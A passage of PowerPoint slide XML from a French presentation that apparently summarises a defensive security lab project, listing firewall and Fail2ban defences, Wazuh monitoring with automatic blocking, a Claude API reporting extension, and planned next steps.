              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Défenses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> actives : iptables, UFW, Fail2ban — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>chaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>vecteur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>d'attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>neutralisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>vérifié</a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="133333"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Supervision </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>opérationnelle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>puis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>blocage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>automatique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> sans intervention humaine</a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="133333"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Extension IA (API Claude) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>fonctionnelle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de bout </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> bout, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>limitée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> par un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>crédit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>compte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> à </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ajouter</a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="342" name="Google Shape;342;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4114800"/>
            <a:ext cx="11109960" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4255"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1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43" name="Google Shape;343;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4297680"/>
            <a:ext cx="365760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D97706"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D97706"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>PERSPECTIVES</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="344" name="Google Shape;344;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4663440"/>
            <a:ext cx="10515600" cy="4114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48148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Déployer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> un agent </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>natif</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> sur </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>cible</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> plus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>récente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> (Debian/Ubuntu LTS)</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800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Ajouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>crédit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>prépayé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>finaliser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>génération</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>automatique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> du rapport IA</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="148148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
